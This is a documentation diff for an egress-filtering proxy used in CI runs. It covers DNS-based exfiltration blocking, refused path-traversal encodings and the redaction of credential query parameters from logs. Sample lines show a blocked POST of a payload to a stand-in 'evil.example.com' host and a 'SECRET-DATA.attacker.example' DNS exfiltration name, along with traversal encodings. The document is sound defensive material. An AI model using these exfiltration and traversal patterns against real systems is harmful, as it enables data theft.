@@ -298,7 +298,7 @@ What each kind of rule decides, and what stays undecrypted:
   proxy's own address, so a lookup alone, even one the command never connects on, cannot be used as an
   exfiltration channel (`SECRET-DATA.attacker.example` would otherwise reach an attacker's own
   nameserver the moment it was forwarded). A name outside the allowlist is answered the same way
-  rather than with NXDOMAIN, so the request that follows is recorded with its full URL, query string
+  rather than with NXDOMAIN, so the request that follows is recorded with its URL, query string
   included, before it is refused. Reverse lookups are the one exception: nothing inside the cage has
   a name to give back, and no rule can name an address backwards, so `PTR` is answered `NXDOMAIN`
   and the lookup is recorded in the resolver log without being reported as allowed or blocked. That
@@ -334,8 +334,8 @@ What each kind of rule decides, and what stays undecrypted:
 | What the isolated command does                          | What happens                                                                                                                                                                                    |
 | ------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | Asks for any name, on or off the allowlist              | Answered locally with the proxy's own address; the query is never forwarded, allowed or not                                                                                                     |
-| Requests a host no rule covers                          | **403**, recorded with its full URL, origin never contacted                                                                                                                                     |
-| Requests a path or method no rule covers                | **403**, recorded with its full URL                                                                                                                                                             |
+| Requests a host no rule covers                          | **403**, recorded with its URL, origin never contacted                                                                                                                                          |
+| Requests a path or method no rule covers                | **403**, recorded with its URL                                                                                                                                                                  |
 | Walks out of an allowed path with `..`                  | **403**: the path is normalised before the rules see it                                                                                                                                         |
 | Encodes the traversal as `%2e%2e` or `..%2f`            | **403**: decoding happens first, and what no normaliser can strip is refused outright                                                                                                           |
 | Uses a backslash, raw or `%5c`, to climb                | **403**: the URL standard treats `\` as `/` for http(s), so a raw backslash is refused outright and `..%5c` like `..%2f`                                                                        |
@@ -370,10 +370,39 @@ What each kind of rule decides, and what stays undecrypted:
 - **`allowed_tls_rules` and `allowed_ip_rules` stay uninspected by design.** Each is recorded with a
   byte count and nothing more, since neither carries a name the proxy can re-terminate TLS for.
 - **Query strings are kept in the log**, since that is also where an exfiltration payload would go.
+  The report is the exception, see [Credentials in a URL](#credentials-in-a-url) below.
 - **UDP is dropped**, so QUIC and HTTP/3 fall back to TCP or fail. Port 53 to the gateway is the one
   exception, which is the resolver. ICMP is dropped too.
 - **No content digests, and no SLSA-style materials.** Nothing here attests to what a request
   returned, only that it was made and to what.
+
+### Credentials in a URL
+
+**Communication details** prints the URL of every request, so a credential written into a query
+string reaches everyone who can read the run. GitHub masks the values it knows as workflow secrets,
+which leaves the ones it does not: a presigned URL's signature, a token minted while the step ran,
+or a secret whose URL-encoded form no longer matches what was registered.
+
+The value of a query parameter named `access_token`, `api_key`, `apikey`, `auth`, `client_secret`,
+`code`, `id_token`, `key`, `password`, `private_token`, `refresh_token`, `secret`, `sig`,
+`signature`, `token`, `x-amz-security-token`, `x-amz-signature` or `x-goog-signature` is therefore
+replaced, whatever its case:
+
+```
+✅ 00:04.212: GET https://cdn.example.com/x.tar.gz?X-Amz-Signature=***&X-Amz-Expires=3600 -> 200 (4.1MB)
+🚫 00:05.003: POST https://evil.example.com/?d=BASE64PAYLOAD -> not-allowed
+```
+
+Everything else is printed as it was sent, parameter names included, so most of what a refused
+request tried to send is still there. Two things this does not cover: a credential in the path,
+which `allowed_url_rules` is written against and so cannot be hidden, and one in a parameter the
+list does not name. It also replaces an exfiltration payload the sender happened to name `code` or
+`key`, so **read a suspected attempt out of the
+[traffic artifact](../README.md#traffic-artifact)**, which keeps every value verbatim, rather than
+out of the summary.
+
+An `allowed_url_rules` block suggested by an audit run never carries a query at all: rules match on
+the path, and a recorded query is as likely to hold a one-off token as anything reusable.
 
 ## Universal Proxy Engine
 
